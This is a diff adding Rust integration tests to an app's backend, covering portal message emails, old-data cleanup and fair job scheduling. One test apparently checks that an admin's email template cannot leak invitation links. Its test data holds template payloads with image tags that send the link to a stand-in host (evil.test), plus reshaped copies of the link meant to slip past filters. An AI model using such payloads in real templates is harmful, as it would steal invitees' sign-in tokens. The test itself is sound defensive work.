@@ -294,6 +294,123 @@ async fn invitations_and_sign_in_links_are_emailed(pool: PgPool) {
 }
 
 #[sqlx::test(migrator = "core_db::MIGRATOR")]
+async fn a_talent_is_emailed_what_their_agent_wrote_in_the_portal(pool: PgPool) {
+    let h = harness(pool).await;
+    let (ws, owner) = h.app.workspace_with_owner("acme").await;
+    let ada = h
+        .app
+        .post("/api/v1/talent")
+        .signed_in(&owner)
+        .json(json!({ "name": "Ada" }))
+        .send()
+        .await
+        .ok()
+        .id("/id");
+    h.app
+        .post(&format!("/api/v1/talent/{ada}/portal"))
+        .signed_in(&owner)
+        .json(json!({ "email": "ada@artist.test" }))
+        .send()
+        .await
+        .ok();
+    let token = h.app.last_invitation_token(ws).await;
+    h.app.accept_new(&token, "Ada Lovelace").await;
+    h.drain().await;
+    let before = h.mailer.sent().len();
+    h.app
+        .post(&format!("/api/v1/talent/{ada}/portal/messages"))
+        .signed_in(&owner)
+        .json(json!({ "body": "Soundcheck moved to 5pm." }))
+        .send()
+        .await
+        .ok();
+    h.drain().await;
+    let sent = h.mailer.sent();
+    assert_eq!(sent.len(), before + 1);
+    assert_eq!(sent[before].to, "ada@artist.test");
+    assert!(
+        sent[before].text.contains("Soundcheck moved to 5pm."),
+        "{}",
+        sent[before].text
+    );
+}
+
+#[sqlx::test(migrator = "core_db::MIGRATOR")]
+async fn a_custom_invitation_template_cannot_leak_the_link(pool: PgPool) {
+    let h = harness(pool).await;
+    let (ws, owner) = h.app.workspace_with_owner("acme").await;
+    // An admin's template tries to get the link into the stored copy, or
+    // off to another site. Saving it is refused; one saved before that
+    // check (inserted here directly) still cannot carry the link.
+    let body = "<p><a href=\"{{ invitation.url }}\">Join</a></p>\
+                <p>{{ invitation.url[:20] }}<!---->{{ invitation.url[20:] }}</p>\
+                <p>{{ invitation.url | urlencode }} {{ invitation.url | reverse }}</p>\
+                <img src=\"https://evil.test/?u={{ invitation.url }}\">\
+                <img src=\"https://evil.test/?v=>{{ invitation.url }}\">\
+                <img src='https://evil.test/?w= href=\"{{ invitation.url }}'>";
+    h.app
+        .post("/api/v1/templates")
+        .signed_in(&owner)
+        .json(json!({
+            "kind": "email", "key": "system.invitation", "name": "Invitation",
+            "subject": "Join {{ invitation.url }}", "body": body,
+        }))
+        .send()
+        .await
+        .expect(axum::http::StatusCode::BAD_REQUEST, "invalid_input");
+    sqlx::query(
+        "INSERT INTO templates (id, workspace_id, kind, key, locale, name, subject, body)
+         VALUES (gen_random_uuid(), $1, 'email', 'system.invitation', 'en', 'Invitation', $2, $3)",
+    )
+    .bind(ws.0)
+    .bind("Join {{ invitation.url }}")
+    .bind(body)
+    .execute(&h.app.owner)
+    .await
+    .unwrap();
+    h.app
+        .post("/api/v1/invitations")
+        .signed_in(&owner)
+        .json(json!({ "email": "new@acme.test", "role": "agent" }))
+        .send()
+        .await
+        .ok();
+    let token = h.app.last_invitation_token(ws).await;
+    h.drain().await;
+
+    let sent = h.mailer.sent();
+    let email = sent.iter().find(|e| e.to == "new@acme.test").unwrap();
+    let html = email.html.as_deref().unwrap();
+    assert!(
+        email.subject.contains(&token) && html.contains("href=\"http"),
+        "the invitee still gets a working link: {html}"
+    );
+    // The token only ever appears as the whole link, never reshaped or
+    // inside another address.
+    let link = format!("/invitations/accept?token={token}");
+    assert!(
+        !html.replace(&link, "").contains(&token[..12]),
+        "only as the link: {html}"
+    );
+    for q in ["u=http", "v=>http"] {
+        assert!(!html.contains(&format!("evil.test/?{q}")), "{html}");
+    }
+    assert!(!html.contains("w= href=\"http"), "{html}");
+
+    let stored: Vec<(String, String, String)> = sqlx::query_as(
+        "SELECT coalesce(subject, ''), coalesce(body_html, ''), body_text FROM outbound_messages WHERE to_address = 'new@acme.test'",
+    )
+    .fetch_all(&h.app.owner)
+    .await
+    .unwrap();
+    assert_eq!(stored.len(), 1);
+    let (subject, html, text) = &stored[0];
+    for part in [subject, html, text] {
+        assert!(!part.contains(&token[..12]), "{part}");
+    }
+}
+
+#[sqlx::test(migrator = "core_db::MIGRATOR")]
 async fn permanent_failures_stop_at_once_and_can_be_retried(pool: PgPool) {
     let h = harness(pool).await;
     let owner = workspace(&h).await;
@@ -768,6 +885,139 @@ async fn cleanup_deletes_old_data_and_expires_old_cursors(pool: PgPool) {
         .ok();
     assert!(page.body["events"].as_array().unwrap().is_empty());
     assert_eq!(page.body["latest"], latest);
+}
+
+#[sqlx::test(migrator = "core_db::MIGRATOR")]
+async fn cleanup_clears_old_logs_payloads_and_sign_ins(pool: PgPool) {
+    let h = harness(pool).await;
+    let owner = workspace(&h).await;
+    let ws = owner.workspace.unwrap().0;
+    // A dead job with its run, a delivery, and a rule that did nothing,
+    // all from 31 days ago; and the same from yesterday.
+    sqlx::raw_sql(sqlx::AssertSqlSafe(format!(
+        r#"DELETE FROM jobs;
+           INSERT INTO jobs (id, workspace_id, kind, payload, status, finished_at) VALUES
+               ('00000000-0000-0000-0000-0000000000a1', '{ws}', 'test.dead', '{{}}', 'dead', now() - interval '31 days'),
+               ('00000000-0000-0000-0000-0000000000a2', '{ws}', 'test.dead', '{{}}', 'dead', now() - interval '1 day');
+           INSERT INTO job_runs (id, job_id, workspace_id, attempt, started_at, succeeded)
+               VALUES ('00000000-0000-0000-0000-0000000000b1', '00000000-0000-0000-0000-0000000000a1', '{ws}', 1, now(), false);
+           INSERT INTO webhook_endpoints (id, workspace_id, url, events, secret_enc)
+               VALUES ('00000000-0000-0000-0000-0000000000c1', '{ws}', 'https://hooks.test/x', '{{*}}', '\x00');
+           INSERT INTO webhook_deliveries (id, workspace_id, endpoint_id, event_id, attempt, succeeded, duration_ms, created_at) VALUES
+               ('00000000-0000-0000-0000-0000000000c2', '{ws}', '00000000-0000-0000-0000-0000000000c1', gen_random_uuid(), 1, false, 5, now() - interval '31 days'),
+               ('00000000-0000-0000-0000-0000000000c3', '{ws}', '00000000-0000-0000-0000-0000000000c1', gen_random_uuid(), 1, false, 5, now() - interval '1 day');
+           INSERT INTO rules (id, workspace_id, name, trigger, trigger_kind, actions)
+               VALUES ('00000000-0000-0000-0000-0000000000d1', '{ws}', 'Quiet', '{{"kind": "event", "topic": "thing.created"}}', 'event', '[]');
+           INSERT INTO rule_runs (id, workspace_id, rule_id, outcome, created_at) VALUES
+               ('00000000-0000-0000-0000-0000000000d2', '{ws}', '00000000-0000-0000-0000-0000000000d1', 'skipped', now() - interval '31 days'),
+               ('00000000-0000-0000-0000-0000000000d3', '{ws}', '00000000-0000-0000-0000-0000000000d1', 'acted', now() - interval '31 days'),
+               ('00000000-0000-0000-0000-0000000000d4', '{ws}', '00000000-0000-0000-0000-0000000000d1', 'skipped', now() - interval '1 day');
+           INSERT INTO stripe_events (id, workspace_id, type, payload, processed_at) VALUES
+               ('evt_old', '{ws}', 'checkout.session.completed', '{{"big": true}}', now() - interval '91 days'),
+               ('evt_new', '{ws}', 'checkout.session.completed', '{{"big": true}}', now() - interval '1 day'),
+               ('evt_waiting', '{ws}', 'checkout.session.completed', '{{"big": true}}', NULL);
+           UPDATE sessions SET expires_at = now() - interval '31 days'
+               WHERE id = (SELECT id FROM sessions ORDER BY created_at LIMIT 1);"#
+    )))
+    .execute(&h.app.owner)
+    .await
+    .unwrap();
+    let sessions: i64 = sqlx::query_scalar("SELECT count(*) FROM sessions")
+        .fetch_one(&h.app.owner)
+        .await
+        .unwrap();
+
+    h.worker.cleanup_once().await.unwrap();
+
+    let ids = |sql: &'static str| {
+        let pool = h.app.owner.clone();
+        async move {
+            sqlx::query_scalar::<_, String>(sql)
+                .fetch_all(&pool)
+                .await
+                .unwrap()
+        }
+    };
+    assert_eq!(
+        ids("SELECT right(id::text, 2) FROM jobs ORDER BY id").await,
+        ["a2"]
+    );
+    assert_eq!(
+        ids("SELECT right(id::text, 2) FROM job_runs").await,
+        Vec::<String>::new()
+    );
+    assert_eq!(
+        ids("SELECT right(id::text, 2) FROM webhook_deliveries").await,
+        ["c3"]
+    );
+    assert_eq!(
+        ids("SELECT right(id::text, 2) FROM rule_runs ORDER BY id").await,
+        ["d3", "d4"]
+    );
+    assert_eq!(
+        ids("SELECT id || ' ' || payload::text FROM stripe_events ORDER BY id").await,
+        [
+            r#"evt_new {"big": true}"#,
+            "evt_old {}",
+            r#"evt_waiting {"big": true}"#
+        ]
+    );
+    let left: i64 = sqlx::query_scalar("SELECT count(*) FROM sessions")
+        .fetch_one(&h.app.owner)
+        .await
+        .unwrap();
+    assert_eq!(left, sessions - 1);
+}
+
+#[sqlx::test(migrator = "core_db::MIGRATOR")]
+async fn workspaces_take_turns_at_the_queue(pool: PgPool) {
+    let h = harness(pool).await;
+    let (busy, _) = h.app.create_workspace("busy", "boss@busy.test").await;
+    let (quiet, _) = h.app.create_workspace("quiet", "boss@quiet.test").await;
+    sqlx::query("DELETE FROM jobs")
+        .execute(&h.app.owner)
+        .await
+        .unwrap();
+    // A big import's worth of work queued an hour ago, then one timed job
+    // elsewhere.
+    sqlx::query(
+        "INSERT INTO jobs (id, workspace_id, kind, payload, run_at)
+         SELECT gen_random_uuid(), $1, 'test.busy', '{}', now() - interval '1 hour' + n * interval '1 ms'
+         FROM generate_series(1, 50) n",
+    )
+    .bind(busy.0)
+    .execute(&h.app.owner)
+    .await
+    .unwrap();
+    sqlx::query(
+        "INSERT INTO jobs (id, workspace_id, kind, payload) VALUES (gen_random_uuid(), $1, 'test.quiet', '{}')",
+    )
+    .bind(quiet.0)
+    .execute(&h.app.owner)
+    .await
+    .unwrap();
+
+    let first = h.worker.claim(2).await.unwrap();
+    let kinds: Vec<&str> = first.iter().map(|j| j.kind.as_str()).collect();
+    assert!(kinds.contains(&"test.quiet"), "{kinds:?}");
+
+    // With more of the busy workspace's work running, a free slot goes to
+    // whoever has less running, even work queued later.
+    sqlx::query("UPDATE jobs SET status = 'succeeded' WHERE kind = 'test.quiet'")
+        .execute(&h.app.owner)
+        .await
+        .unwrap();
+    let more = h.worker.claim(3).await.unwrap();
+    assert!(more.iter().all(|j| j.kind == "test.busy"));
+    sqlx::query(
+        "INSERT INTO jobs (id, workspace_id, kind, payload) VALUES (gen_random_uuid(), $1, 'test.quiet', '{}')",
+    )
+    .bind(quiet.0)
+    .execute(&h.app.owner)
+    .await
+    .unwrap();
+    let next = h.worker.claim(1).await.unwrap();
+    assert_eq!(next[0].kind, "test.quiet");
 }
 
 #[sqlx::test(migrator = "core_db::MIGRATOR")]
